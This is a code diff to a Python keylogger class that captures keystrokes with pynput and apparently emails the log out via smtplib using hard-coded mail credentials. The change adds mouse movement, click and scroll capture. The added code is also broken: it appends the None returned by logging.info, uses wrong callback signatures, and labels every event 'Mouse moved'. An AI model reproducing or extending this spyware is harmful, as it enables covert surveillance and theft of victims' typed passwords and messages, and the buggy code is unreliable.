@@ -1,6 +1,8 @@
 import smtplib
 import threading
 from pynput import keyboard
+from pynput.mouse import Listener
+import logging
 
 
 class KeyLogger:
@@ -12,6 +14,18 @@ class KeyLogger:
 
     def appendlog(self, string):
         self.log = self.log + string
+
+    def on_move(self, x, y):
+        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_move)
+
+    def on_click(self, x, y):
+        current_click = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_click)
+
+    def on_scroll(self, x, y):
+        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+        self.appendlog(current_scroll)
 
     def save_data(self, key):
         try:
@@ -44,8 +58,9 @@ class KeyLogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+            mouse_listener.join()
 
 
 keylogger = KeyLogger(10, 'MAIL', 'PASSWORD')
 keylogger.run()
-
